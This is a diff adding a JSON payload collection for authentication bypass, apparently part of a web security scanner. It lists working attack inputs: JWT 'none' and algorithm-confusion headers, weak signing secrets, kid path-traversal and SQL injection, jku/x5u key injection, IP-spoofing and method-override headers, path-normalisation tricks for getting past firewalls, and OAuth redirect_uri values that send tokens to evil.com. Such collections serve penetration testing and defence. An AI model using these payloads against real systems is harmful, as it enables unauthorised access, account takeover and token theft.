@@ -1,0 +1,115 @@
+{
+  "category": "auth_bypass",
+  "contexts": {
+    "jwt_none": {
+      "description": "JWT algorithm confusion attacks using 'none' algorithm",
+      "payloads": [
+        {"payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0", "description": "JWT header with alg:none (base64: {\"alg\":\"none\",\"typ\":\"JWT\"})", "waf_bypass": false},
+        {"payload": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0", "description": "JWT header with alg:None (capital N)", "waf_bypass": false},
+        {"payload": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0", "description": "JWT header with alg:NONE (uppercase)", "waf_bypass": false},
+        {"payload": "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0", "description": "JWT header with alg:nOnE (mixed case)", "waf_bypass": false}
+      ]
+    },
+    "jwt_weak_key": {
+      "description": "JWT signed with known weak/common secrets for brute-force testing",
+      "payloads": [
+        {"payload": "secret", "description": "Common weak JWT secret", "waf_bypass": false},
+        {"payload": "password", "description": "Common weak JWT secret", "waf_bypass": false},
+        {"payload": "123456", "description": "Common numeric weak secret", "waf_bypass": false},
+        {"payload": "changeme", "description": "Default application secret", "waf_bypass": false},
+        {"payload": "your-256-bit-secret", "description": "JWT documentation example secret", "waf_bypass": false},
+        {"payload": "secretkey", "description": "Common default secret", "waf_bypass": false},
+        {"payload": "jwt_secret", "description": "Descriptive weak secret", "waf_bypass": false},
+        {"payload": "HS256", "description": "Algorithm name used as secret", "waf_bypass": false},
+        {"payload": "", "description": "Empty string as JWT secret", "waf_bypass": false}
+      ]
+    },
+    "jwt_confusion": {
+      "description": "JWT algorithm confusion attacks (RS256 to HS256)",
+      "payloads": [
+        {"payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", "description": "RS256->HS256 confusion header: sign this with the server's RSA public key as HMAC secret", "waf_bypass": false},
+        {"payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "description": "Base64-encoded HS256 header for RS256->HS256 confusion attack", "waf_bypass": false},
+        {"payload": "{\"alg\":\"HS384\",\"typ\":\"JWT\"}", "description": "RS384->HS384 confusion: sign with RSA public key as HMAC-SHA384 secret", "waf_bypass": false},
+        {"payload": "{\"alg\":\"HS512\",\"typ\":\"JWT\"}", "description": "RS512->HS512 confusion: sign with RSA public key as HMAC-SHA512 secret", "waf_bypass": false}
+      ]
+    },
+    "jwt_kid_injection": {
+      "description": "JWT key ID (kid) parameter injection for key confusion and SQLi attacks",
+      "payloads": [
+        {"payload": "{\"kid\":\"../../dev/null\",\"alg\":\"HS256\"}", "description": "kid path traversal to /dev/null — sign with empty string as secret", "waf_bypass": false},
+        {"payload": "{\"kid\":\"../../proc/sys/kernel/hostname\",\"alg\":\"HS256\"}", "description": "kid path traversal to hostname file — sign with hostname as secret", "waf_bypass": false},
+        {"payload": "{\"kid\":\"' UNION SELECT 'known-secret'--\",\"alg\":\"HS256\"}", "description": "SQLi in kid to force known secret — sign with 'known-secret'", "waf_bypass": false},
+        {"payload": "{\"kid\":\"../../../../../../../etc/hostname\",\"alg\":\"HS256\"}", "description": "Deep traversal kid to /etc/hostname — sign with file contents", "waf_bypass": false},
+        {"payload": "{\"kid\":\"key.pem\",\"alg\":\"HS256\"}", "description": "kid pointing to known key file — sign with that file's contents", "waf_bypass": false}
+      ]
+    },
+    "jwt_jku_x5u": {
+      "description": "JWT header injection via jku (JWK Set URL) and x5u (X.509 URL) claims",
+      "payloads": [
+        {"payload": "{\"jku\":\"https://COLLABORATOR_URL/.well-known/jwks.json\",\"alg\":\"RS256\"}", "description": "jku injection: Collaborator interaction confirms server fetches the URL — full bypass requires hosting matching JWKS", "waf_bypass": false},
+        {"payload": "{\"x5u\":\"https://COLLABORATOR_URL/cert.pem\",\"alg\":\"RS256\"}", "description": "x5u injection: Collaborator interaction confirms server fetches the X.509 chain — full bypass requires hosting matching cert", "waf_bypass": false},
+        {"payload": "{\"jwk\":{\"kty\":\"RSA\",\"n\":\"ATTACKER_MODULUS\",\"e\":\"AQAB\"},\"alg\":\"RS256\"}", "description": "Embedded JWK: inject attacker's public key directly in JWT header", "waf_bypass": false},
+        {"payload": "{\"jku\":\"https://target.com/.well-known/jwks.json/../../../COLLABORATOR_URL/jwks.json\",\"alg\":\"RS256\"}", "description": "jku with path traversal to bypass URL allowlist on target domain — Collaborator interaction confirms traversal", "waf_bypass": true}
+      ]
+    },
+    "header_bypass": {
+      "description": "HTTP header injection for IP-based access control bypass",
+      "payloads": [
+        {"payload": "X-Forwarded-For: 127.0.0.1", "description": "Spoof source IP to localhost via X-Forwarded-For", "waf_bypass": false},
+        {"payload": "X-Forwarded-For: 192.168.1.1", "description": "Spoof source IP to internal network address", "waf_bypass": false},
+        {"payload": "X-Real-IP: 127.0.0.1", "description": "Spoof IP via X-Real-IP header", "waf_bypass": false},
+        {"payload": "X-Original-URL: /admin", "description": "Override URL path via X-Original-URL (supported by some reverse proxies)", "waf_bypass": false},
+        {"payload": "X-Rewrite-URL: /admin", "description": "Override URL path via X-Rewrite-URL", "waf_bypass": false},
+        {"payload": "X-Custom-IP-Authorization: 127.0.0.1", "description": "Custom IP authorization header seen in some apps", "waf_bypass": false},
+        {"payload": "X-Forwarded-Host: localhost", "description": "Host header spoofing via X-Forwarded-Host", "waf_bypass": false},
+        {"payload": "X-Host: localhost", "description": "Alternative host override header", "waf_bypass": false},
+        {"payload": "X-ProxyUser-Ip: 127.0.0.1", "description": "Proxy user IP header bypass", "waf_bypass": false},
+        {"payload": "Client-IP: 127.0.0.1", "description": "Client-IP header for IP-based access control bypass", "waf_bypass": false},
+        {"payload": "True-Client-IP: 127.0.0.1", "description": "Akamai/CDN True-Client-IP header bypass", "waf_bypass": false},
+        {"payload": "CF-Connecting-IP: 127.0.0.1", "description": "Cloudflare CF-Connecting-IP header spoofing", "waf_bypass": false},
+        {"payload": "Forwarded: for=127.0.0.1", "description": "RFC 7239 Forwarded header for IP spoofing", "waf_bypass": false}
+      ]
+    },
+    "method_override": {
+      "description": "HTTP method override techniques to bypass method-based access controls",
+      "payloads": [
+        {"payload": "X-HTTP-Method-Override: DELETE", "description": "Override HTTP method to DELETE via header", "waf_bypass": false},
+        {"payload": "X-HTTP-Method-Override: PUT", "description": "Override HTTP method to PUT via header", "waf_bypass": false},
+        {"payload": "X-Method-Override: DELETE", "description": "Alternative method override header", "waf_bypass": false},
+        {"payload": "X-Method-Override: PATCH", "description": "Override to PATCH via X-Method-Override", "waf_bypass": false},
+        {"payload": "_method=DELETE", "description": "POST body _method parameter for method override (Rails, Laravel)", "waf_bypass": false},
+        {"payload": "_method=PUT", "description": "PUT method via _method POST parameter", "waf_bypass": false},
+        {"payload": "?_method=DELETE", "description": "Query string _method for method override", "waf_bypass": false}
+      ]
+    },
+    "path_normalization": {
+      "description": "Auth bypass via URL path normalization differences between proxy/WAF and application",
+      "payloads": [
+        {"payload": "/admin/./", "description": "Dot segment normalization bypass", "waf_bypass": true},
+        {"payload": "//admin", "description": "Double slash prefix bypass", "waf_bypass": true},
+        {"payload": "/;/admin", "description": "Tomcat path parameter bypass", "waf_bypass": true},
+        {"payload": "/admin..;/", "description": "Tomcat/Spring dotdot-semicolon bypass", "waf_bypass": true},
+        {"payload": "/%2fadmin/", "description": "URL-encoded slash bypass", "waf_bypass": true},
+        {"payload": "/ADMIN", "description": "Case sensitivity bypass", "waf_bypass": true},
+        {"payload": "/admin%00", "description": "Null byte path termination", "waf_bypass": true},
+        {"payload": "/admin%20", "description": "Trailing space bypass", "waf_bypass": true},
+        {"payload": "/.;/admin", "description": "Spring Security dot-semicolon bypass", "waf_bypass": true},
+        {"payload": "/admin/../admin/", "description": "Double traversal normalization", "waf_bypass": true},
+        {"payload": "/..;/admin", "description": "Spring Security path traversal via semicolon (CVE-2022-22978)", "waf_bypass": true},
+        {"payload": "/%2e/admin", "description": "URL-encoded dot for path normalization bypass", "waf_bypass": true},
+        {"payload": "/admin%00.json", "description": "Null byte with extension to bypass path-based routing rules", "waf_bypass": true}
+      ]
+    },
+    "oauth_bypass": {
+      "description": "OAuth/OIDC flow bypass via redirect_uri manipulation and state parameter abuse",
+      "payloads": [
+        {"payload": "redirect_uri=https://evil.com", "description": "Open redirect in OAuth flow for token theft", "waf_bypass": false},
+        {"payload": "redirect_uri=https://target.com/callback/../../../evil.com", "description": "Path traversal in redirect_uri", "waf_bypass": true},
+        {"payload": "redirect_uri=https://target.com%40evil.com", "description": "URL authority confusion via @ encoding", "waf_bypass": true},
+        {"payload": "redirect_uri=https://evil.com%23.target.com", "description": "Fragment bypass for redirect_uri validation", "waf_bypass": true},
+        {"payload": "response_type=token", "description": "Force implicit flow for token in URL fragment", "waf_bypass": false},
+        {"payload": "state=FIXED_VALUE", "description": "State parameter fixation (CSRF on OAuth)", "waf_bypass": false}
+      ]
+    }
+  }
+}
